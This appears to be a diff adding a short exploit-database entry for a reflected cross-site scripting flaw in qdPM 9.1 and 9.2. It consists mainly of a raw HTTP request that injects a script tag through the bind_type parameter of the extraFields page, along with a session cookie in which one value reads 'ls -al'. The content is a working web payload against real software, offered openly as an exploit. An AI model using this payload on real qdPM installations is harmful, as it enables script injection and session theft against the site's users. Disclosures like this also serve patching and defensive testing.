@@ -1,0 +1,21 @@
+# Exploit Title: qdPM 9.x -[bind_type] - Cross-Site Scripting
+# Exploit Author: Or4nG.M4n
+# Vendor Homepage: https://qdpm.net/
+# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
+# Version: 9.2 , 9.1
+
+XSS Reflected .
+
+GET http://localhost/qdpm/index.php/extraFields?bind_type=<script>alert(OR4NG)</script> HTTP/1.1
+Host: localhost
+User-Agent: Safari/89.0 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: ar,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: skin=ColorNature; sidebar_closed=ls -al; qdPM8=rfjniks7j5mkaur7vcliou18bd
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
